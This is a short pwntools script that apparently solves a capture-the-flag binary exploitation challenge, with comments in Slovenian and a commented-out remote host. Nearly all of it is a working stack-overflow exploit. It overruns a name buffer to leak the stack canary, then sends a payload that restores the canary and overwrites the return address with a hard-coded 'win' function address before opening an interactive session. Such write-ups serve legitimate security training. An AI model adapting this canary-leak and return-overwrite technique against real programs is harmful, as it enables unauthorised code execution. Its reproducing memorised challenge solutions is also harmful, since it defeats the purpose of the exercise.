from pwn import *

# Use one of the following at a time
p = process('./main') # Local challenge

# p = remote("inst-e2eaaez9vy.tls.vuln.si", 443, ssl=True)

p.sendline(b"a" * (9*8))

p.recvline() # Enter your name
p.recvline() # Hello, aaa

leak = p.recv(7) # preberemo 7b (canary je 8b, 1b smo povozil)
leak = b"\x00" + leak
leak = u64(leak)

p.sendline(b"n") # Is this name correct?

payload = b"a" * (9 * 8) # buffer
payload += p64(leak) # Canary
payload += b"a" * 8 # rbp
payload += p64(0x4011fb) # win

p.sendline(payload)

p.sendline(b"y") # yes

p.interactive()


